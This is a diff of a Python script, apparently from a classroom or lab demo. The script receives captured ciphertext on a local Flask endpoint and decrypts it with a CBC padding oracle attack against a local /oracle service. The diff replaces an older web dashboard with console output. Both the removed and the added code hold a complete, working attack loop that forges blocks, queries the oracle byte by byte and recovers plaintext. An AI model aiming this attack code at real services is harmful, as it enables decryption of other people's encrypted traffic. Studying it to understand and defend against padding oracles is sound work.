@@ -1,39 +1,45 @@
 #!/usr/bin/env python3
 """
-MITM Attacker / Padding Oracle Attack Dashboard  (port 5001)
-
-- Captures ciphertext sent from the sender server
-- Performs CBC padding oracle attack by querying the sender's /oracle endpoint
-- Streams decryption progress in real-time via SSE to a web dashboard
+Padding Oracle Attacker
+Run in Terminal 2. Receives ciphertext from the sender,
+then decrypts it using the CBC padding oracle attack.
+Prints each step: every byte guess that gets a 'valid' response from the oracle.
 """
 
 import threading
-import queue
-import json
+import logging
 import time
-from flask import Flask, request, jsonify, render_template_string, Response
+from flask import Flask, request, jsonify
 import requests as http_req
 
-app = Flask(__name__)
-
-BLOCK_SIZE = 16
+# --- Hardcoded values ---
+BLOCK_SIZE = 16                        # AES block size: 16 bytes (128 bits)
 ORACLE_URL = "http://127.0.0.1:5000/oracle"
+LISTEN_PORT = 5001
 
-captured = []           # list of captured ciphertext hex strings
-attack_log = {}         # ciphertext_hex -> attack state dict
-sse_queues = []         # list of Queue objects for SSE clients
-sse_lock = threading.Lock()
+# --- Flask app to receive ciphertext ---
+app = Flask(__name__)
+logging.getLogger("werkzeug").setLevel(logging.ERROR)
+
+captured_event = threading.Event()
+captured_ct = {"hex": None}
 
 
-def broadcast(event_type, data):
-    """Push an SSE event to all connected browser clients."""
-    msg = json.dumps({"type": event_type, **data})
-    with sse_lock:
-        for q in sse_queues:
-            try:
-                q.put_nowait(msg)
-            except queue.Full:
-                pass
+@app.route("/capture", methods=["POST"])
+def capture():
+    data = request.get_json(force=True)
+    ct_hex = data.get("ciphertext", "")
+    if ct_hex:
+        captured_ct["hex"] = ct_hex
+        captured_event.set()
+    return jsonify({"status": "ok"})
+
+
+# --- Helper functions ---
+
+def fmt(data):
+    """Format bytes as space-separated decimal values."""
+    return " ".join(str(b) for b in data)
 
 
 def xor_bytes(a, b):
@@ -41,406 +47,152 @@ def xor_bytes(a, b):
 
 
 def split_blocks(data):
-    return [data[i : i + BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
+    return [data[i:i+BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]
 
 
-def oracle_query(two_blocks_hex):
-    resp = http_req.post(ORACLE_URL, json={"ciphertext": two_blocks_hex}, timeout=5)
-    return resp.json().get("valid", False)
+def ask_oracle(two_blocks):
+    """Send 2 blocks to the server, get back True (padding valid) or False."""
+    try:
+        resp = http_req.post(ORACLE_URL, json={"ciphertext": two_blocks.hex()}, timeout=10)
+        return resp.json().get("valid", False)
+    except Exception:
+        return False
 
 
-def run_attack(ct_hex):
-    """Run the full padding oracle attack in a background thread."""
+# --- The attack ---
+
+def padding_oracle_attack(ct_hex):
     data = bytes.fromhex(ct_hex)
     blocks = split_blocks(data)
-    total_ct = len(blocks) - 1
-    queries = 0
+    num_ct_blocks = len(blocks) - 1
 
-    state = {
-        "status": "running",
-        "total_blocks": total_ct,
-        "current_block": 0,
-        "bytes_recovered": 0,
-        "total_bytes": total_ct * BLOCK_SIZE,
-        "plaintext_bytes": [],
-        "plaintext": "",
-        "queries": 0,
-    }
-    attack_log[ct_hex] = state
+    print("\n" + "=" * 60)
+    print("  PADDING ORACLE ATTACK")
+    print("=" * 60)
+    print(f"  Ciphertext     : {fmt(data)}")
+    print(f"  Total length   : {len(data)} bytes")
+    print(f"  Block size     : {BLOCK_SIZE} bytes")
+    print(f"  Blocks         : 1 IV + {num_ct_blocks} ciphertext")
+    print(f"  Padding method : PKCS#7")
+    print(f"  Oracle URL     : {ORACLE_URL}")
+    print("=" * 60)
 
-    broadcast("attack_start", {
-        "ct": ct_hex,
-        "total_blocks": total_ct,
-        "total_bytes": total_ct * BLOCK_SIZE,
-    })
+    query_count = 0
+    all_plaintext = b""
+    start = time.time()
 
-    all_plain = b""
-
-    for blk_idx in range(1, len(blocks)):
-        prev = blocks[blk_idx - 1]
-        target = blocks[blk_idx]
+    for blk_num in range(1, len(blocks)):
+        prev_block = blocks[blk_num - 1]
+        target_block = blocks[blk_num]
         intermediate = bytearray(BLOCK_SIZE)
-        state["current_block"] = blk_idx
 
-        broadcast("block_start", {"ct": ct_hex, "block": blk_idx, "of": total_ct})
+        print(f"\n--- Block {blk_num} of {num_ct_blocks} ---")
+        print(f"  Previous block : {fmt(prev_block)}")
+        print(f"  Target block   : {fmt(target_block)}")
 
         for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
-            pad_val = BLOCK_SIZE - byte_pos
-            crafted = bytearray(BLOCK_SIZE)
+            target_padding = BLOCK_SIZE - byte_pos
 
+            crafted = bytearray(BLOCK_SIZE)
             for k in range(byte_pos + 1, BLOCK_SIZE):
-                crafted[k] = intermediate[k] ^ pad_val
+                crafted[k] = intermediate[k] ^ target_padding
 
             found = False
             for guess in range(256):
                 crafted[byte_pos] = guess
-                forged_hex = (bytes(crafted) + target).hex()
-                queries += 1
+                forged = bytes(crafted) + target_block
+                query_count += 1
+                valid = ask_oracle(forged)
 
-                if oracle_query(forged_hex):
+                if valid:
                     if byte_pos == BLOCK_SIZE - 1:
                         check = bytearray(crafted)
                         check[byte_pos - 1] ^= 0x01
-                        queries += 1
-                        if not oracle_query((bytes(check) + target).hex()):
+                        query_count += 1
+                        if not ask_oracle(bytes(check) + target_block):
                             continue
 
-                    intermediate[byte_pos] = guess ^ pad_val
-                    pt_byte = prev[byte_pos] ^ intermediate[byte_pos]
+                    intermediate[byte_pos] = guess ^ target_padding
+                    pt_byte = prev_block[byte_pos] ^ intermediate[byte_pos]
+                    char = chr(pt_byte) if 32 <= pt_byte < 127 else "."
 
-                    state["bytes_recovered"] += 1
-                    state["queries"] = queries
-                    state["plaintext_bytes"].append(pt_byte)
-
-                    broadcast("byte_found", {
-                        "ct": ct_hex,
-                        "block": blk_idx,
-                        "pos": BLOCK_SIZE - byte_pos,
-                        "byte": pt_byte,
-                        "char": chr(pt_byte) if 32 <= pt_byte < 127 else ".",
-                        "recovered": state["bytes_recovered"],
-                        "total": state["total_bytes"],
-                        "queries": queries,
-                    })
+                    print(f"  Byte {BLOCK_SIZE - byte_pos:2d}/16 | "
+                          f"guess={guess} | "
+                          f"oracle=VALID | "
+                          f"intermediate={intermediate[byte_pos]} | "
+                          f"plaintext_byte={pt_byte} ('{char}') | "
+                          f"queries={query_count}")
                     found = True
                     break
 
             if not found:
-                state["status"] = "error"
-                broadcast("error", {"ct": ct_hex, "msg": f"Failed at block {blk_idx} byte {byte_pos}"})
+                print(f"  FAILED at byte position {byte_pos}")
                 return
 
-        pt_block = xor_bytes(prev, bytes(intermediate))
-        all_plain += pt_block
+        pt_block = xor_bytes(prev_block, bytes(intermediate))
+        all_plaintext += pt_block
+        print(f"  Block {blk_num} recovered : {fmt(pt_block)}")
 
-    # Strip PKCS#7 padding
-    try:
-        pad_len = all_plain[-1]
-        if 1 <= pad_len <= BLOCK_SIZE and all_plain[-pad_len:] == bytes([pad_len] * pad_len):
-            all_plain = all_plain[:-pad_len]
-    except Exception:
-        pass
+    elapsed = time.time() - start
+
+    # strip PKCS#7 padding
+    raw = all_plaintext
+    pad_byte = raw[-1]
+    if 1 <= pad_byte <= BLOCK_SIZE and raw[-pad_byte:] == bytes([pad_byte] * pad_byte):
+        plaintext = raw[:-pad_byte]
+        print(f"\nPKCS#7 padding: last {pad_byte} byte(s) have value {pad_byte}, stripped.")
+    else:
+        plaintext = raw
+        print(f"\nNo valid PKCS#7 padding found, returning raw bytes.")
 
     try:
-        plaintext_str = all_plain.decode()
+        text = plaintext.decode()
     except UnicodeDecodeError:
-        plaintext_str = all_plain.hex()
+        text = None
 
-    state["status"] = "done"
-    state["plaintext"] = plaintext_str
-    state["queries"] = queries
-
-    broadcast("attack_done", {
-        "ct": ct_hex,
-        "plaintext": plaintext_str,
-        "queries": queries,
-    })
-
-
-PAGE = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>MITM Attacker Dashboard</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    font-family: 'Segoe UI', system-ui, sans-serif;
-    background: #0c0a09; color: #e7e5e4;
-    min-height: 100vh; display: flex; justify-content: center; padding: 40px 20px;
-  }
-  .card {
-    background: #1c1917; border-radius: 16px; padding: 40px;
-    max-width: 750px; width: 100%; box-shadow: 0 8px 32px rgba(0,0,0,.5);
-  }
-  h1 { font-size: 1.6rem; color: #ef4444; margin-bottom: 4px; }
-  .sub { color: #a8a29e; margin-bottom: 24px; font-size: .9rem; }
-  .section { margin-bottom: 24px; }
-  .section-title { color: #fbbf24; font-size: .85rem; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
-
-  .captured-box {
-    background: #0c0a09; border: 1px solid #292524; border-radius: 10px;
-    padding: 16px; font-family: 'Courier New', monospace; font-size: .82rem;
-    word-break: break-all; color: #fb923c; min-height: 48px;
-  }
-  .empty { color: #57534e; font-style: italic; }
-
-  button {
-    padding: 12px 28px; border: none; border-radius: 10px;
-    background: #dc2626; color: #fff; font-size: 1rem; cursor: pointer;
-    transition: background .2s;
-  }
-  button:hover { background: #b91c1c; }
-  button:disabled { background: #44403c; cursor: not-allowed; }
-
-  .progress-bar-outer {
-    background: #292524; border-radius: 8px; height: 28px; margin: 16px 0;
-    overflow: hidden; position: relative;
-  }
-  .progress-bar-inner {
-    background: linear-gradient(90deg, #dc2626, #f97316);
-    height: 100%; width: 0%; transition: width .15s; border-radius: 8px;
-  }
-  .progress-text {
-    position: absolute; top: 0; left: 0; right: 0; height: 28px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: .8rem; color: #fff; font-weight: 600;
-  }
-
-  .live-bytes {
-    font-family: 'Courier New', monospace; font-size: 1.1rem;
-    background: #0c0a09; border-radius: 10px; padding: 16px;
-    border: 1px solid #292524; min-height: 48px;
-    letter-spacing: 2px; line-height: 1.8;
-  }
-  .byte-known { color: #4ade80; }
-  .byte-unknown { color: #44403c; }
-  .byte-padding { color: #57534e; }
-
-  .result-box {
-    background: #052e16; border: 2px solid #22c55e; border-radius: 10px;
-    padding: 20px; margin-top: 20px; display: none;
-  }
-  .result-box .label { color: #86efac; font-size: .8rem; margin-bottom: 6px; }
-  .result-box .text { color: #4ade80; font-size: 1.3rem; font-weight: bold; }
-
-  .stats { color: #a8a29e; font-size: .82rem; margin-top: 8px; }
-</style>
-</head>
-<body>
-<div class="card">
-  <h1>MITM Attacker Dashboard</h1>
-  <p class="sub">Intercepts encrypted traffic and decrypts it using the padding oracle vulnerability.</p>
-
-  <div class="section">
-    <div class="section-title">Captured Ciphertext</div>
-    <div class="captured-box" id="captured">
-      <span class="empty">Waiting for the sender to send a message...</span>
-    </div>
-  </div>
-
-  <button id="attackBtn" onclick="startAttack()" disabled>Waiting for ciphertext...</button>
-
-  <div class="section" id="progressSection" style="display:none; margin-top: 24px;">
-    <div class="section-title">Decryption Progress</div>
-    <div class="progress-bar-outer">
-      <div class="progress-bar-inner" id="bar"></div>
-      <div class="progress-text" id="barText">0%</div>
-    </div>
-    <div class="stats" id="stats"></div>
-  </div>
-
-  <div class="section" id="bytesSection" style="display:none; margin-top: 12px;">
-    <div class="section-title">Recovered Bytes (real-time)</div>
-    <div class="live-bytes" id="liveBytes"></div>
-  </div>
-
-  <div class="result-box" id="resultBox">
-    <div class="label">DECRYPTED PLAINTEXT</div>
-    <div class="text" id="resultText"></div>
-    <div class="stats" id="resultStats"></div>
-  </div>
-</div>
-
-<script>
-let latestCt = null;
-let totalBytes = 0;
-let recoveredChars = [];
-
-// Poll for new captures
-setInterval(async () => {
-  const r = await fetch('/captured');
-  const d = await r.json();
-  if (d.latest) {
-    const el = document.getElementById('captured');
-    el.textContent = d.latest;
-    el.classList.remove('empty');
-    if (latestCt !== d.latest) {
-      latestCt = d.latest;
-      const btn = document.getElementById('attackBtn');
-      btn.disabled = false;
-      btn.textContent = 'Start Padding Oracle Attack';
-      document.getElementById('resultBox').style.display = 'none';
-      document.getElementById('progressSection').style.display = 'none';
-      document.getElementById('bytesSection').style.display = 'none';
-    }
-  }
-}, 1000);
-
-function startAttack() {
-  if (!latestCt) return;
-  const btn = document.getElementById('attackBtn');
-  btn.disabled = true;
-  btn.textContent = 'Attack running...';
-  recoveredChars = [];
-  document.getElementById('progressSection').style.display = 'block';
-  document.getElementById('bytesSection').style.display = 'block';
-  document.getElementById('resultBox').style.display = 'none';
-  document.getElementById('bar').style.width = '0%';
-  document.getElementById('barText').textContent = '0%';
-  document.getElementById('liveBytes').innerHTML = '';
-  document.getElementById('stats').textContent = '';
-
-  fetch('/attack', { method: 'POST', headers: {'Content-Type':'application/json'},
-                      body: JSON.stringify({ct: latestCt}) });
-
-  const evtSource = new EventSource('/stream');
-  evtSource.onmessage = function(e) {
-    const d = JSON.parse(e.data);
-
-    if (d.type === 'attack_start') {
-      totalBytes = d.total_bytes;
-      let dots = '';
-      for (let i = 0; i < totalBytes; i++) dots += '<span class="byte-unknown">??</span> ';
-      document.getElementById('liveBytes').innerHTML = dots;
-    }
-
-    if (d.type === 'byte_found') {
-      recoveredChars.push({byte: d.byte, char: d.char});
-      const pct = Math.round((d.recovered / d.total) * 100);
-      document.getElementById('bar').style.width = pct + '%';
-      document.getElementById('barText').textContent = pct + '% (' + d.recovered + '/' + d.total + ')';
-      document.getElementById('stats').textContent = 'Oracle queries: ' + d.queries;
-
-      // Update live bytes display
-      const container = document.getElementById('liveBytes');
-      let html = '';
-      for (let i = 0; i < totalBytes; i++) {
-        if (i < recoveredChars.length) {
-          const c = recoveredChars[i];
-          const hex = c.byte.toString(16).padStart(2, '0');
-          html += '<span class="byte-known" title="' + c.char + '">' + hex + '</span> ';
-        } else {
-          html += '<span class="byte-unknown">??</span> ';
-        }
-      }
-      container.innerHTML = html;
-    }
-
-    if (d.type === 'attack_done') {
-      evtSource.close();
-      document.getElementById('bar').style.width = '100%';
-      document.getElementById('barText').textContent = '100%';
-      document.getElementById('resultBox').style.display = 'block';
-      document.getElementById('resultText').textContent = d.plaintext;
-      document.getElementById('resultStats').textContent = 'Total oracle queries: ' + d.queries;
-      const btn = document.getElementById('attackBtn');
-      btn.disabled = false;
-      btn.textContent = 'Attack again';
-    }
-
-    if (d.type === 'error') {
-      evtSource.close();
-      alert('Attack failed: ' + d.msg);
-      document.getElementById('attackBtn').disabled = false;
-      document.getElementById('attackBtn').textContent = 'Retry Attack';
-    }
-  };
-}
-</script>
-</body>
-</html>
-"""
+    print("\n" + "=" * 60)
+    print("  RESULT")
+    print("=" * 60)
+    print(f"  Decrypted bytes : {fmt(plaintext)}")
+    if text is not None:
+        print(f"  Decrypted text  : {text}")
+    print(f"  Total queries   : {query_count}")
+    print(f"  Time            : {elapsed:.2f}s")
+    print("=" * 60 + "\n")
 
 
-@app.route("/")
-def index():
-    return render_template_string(PAGE)
-
-
-@app.route("/capture", methods=["POST"])
-def capture():
-    """Receives ciphertext forwarded from the sender server."""
-    data = request.get_json(force=True)
-    ct_hex = data.get("ciphertext", "")
-    if ct_hex:
-        captured.append(ct_hex)
-        broadcast("captured", {"ct": ct_hex})
-        print(f"  [CAPTURED] {ct_hex[:40]}...")
-    return jsonify({"status": "ok"})
-
-
-@app.route("/captured")
-def get_captured():
-    """Returns the latest captured ciphertext (for polling)."""
-    if captured:
-        return jsonify({"latest": captured[-1], "count": len(captured)})
-    return jsonify({"latest": None, "count": 0})
-
-
-@app.route("/attack", methods=["POST"])
-def attack():
-    """Start the padding oracle attack on a captured ciphertext."""
-    data = request.get_json(force=True)
-    ct_hex = data.get("ct", "")
-    if not ct_hex:
-        if captured:
-            ct_hex = captured[-1]
-        else:
-            return jsonify({"error": "no ciphertext"}), 400
-
-    t = threading.Thread(target=run_attack, args=(ct_hex,), daemon=True)
+def main():
+    t = threading.Thread(
+        target=lambda: app.run(host="127.0.0.1", port=LISTEN_PORT, threaded=True),
+        daemon=True,
+    )
     t.start()
-    return jsonify({"status": "started"})
 
+    print("=" * 60)
+    print("  ATTACKER — PADDING ORACLE")
+    print("=" * 60)
+    print(f"  Block size  : {BLOCK_SIZE} bytes")
+    print(f"  Padding     : PKCS#7")
+    print(f"  Oracle URL  : {ORACLE_URL}")
+    print(f"  Listening   : port {LISTEN_PORT}")
+    print("=" * 60)
+    print("\nWaiting for ciphertext from sender...\n")
 
-@app.route("/stream")
-def stream():
-    """SSE endpoint: streams real-time attack progress to the browser."""
-    q = queue.Queue(maxsize=2000)
-    with sse_lock:
-        sse_queues.append(q)
+    while True:
+        captured_event.wait()
+        captured_event.clear()
 
-    def generate():
-        try:
-            while True:
-                try:
-                    msg = q.get(timeout=30)
-                    yield f"data: {msg}\n\n"
-                except queue.Empty:
-                    yield ": keepalive\n\n"
-        except GeneratorExit:
-            pass
-        finally:
-            with sse_lock:
-                if q in sse_queues:
-                    sse_queues.remove(q)
+        ct_hex = captured_ct["hex"]
+        ct_bytes = bytes.fromhex(ct_hex)
+        print(f"Ciphertext received: {fmt(ct_bytes)}")
 
-    return Response(generate(), mimetype="text/event-stream",
-                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
+        padding_oracle_attack(ct_hex)
 
-
-@app.route("/status")
-def status():
-    """Returns the current attack state (for programmatic testing)."""
-    if not attack_log:
-        return jsonify({"status": "idle"})
-    latest_key = list(attack_log.keys())[-1]
-    return jsonify(attack_log[latest_key])
+        print("Waiting for next ciphertext...\n")
 
 
 if __name__ == "__main__":
-    print("\n  Attacker Dashboard running on http://127.0.0.1:5001")
-    print("  Waiting to capture ciphertext from the sender...\n")
-    app.run(host="127.0.0.1", port=5001, threaded=True)
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nBye.")
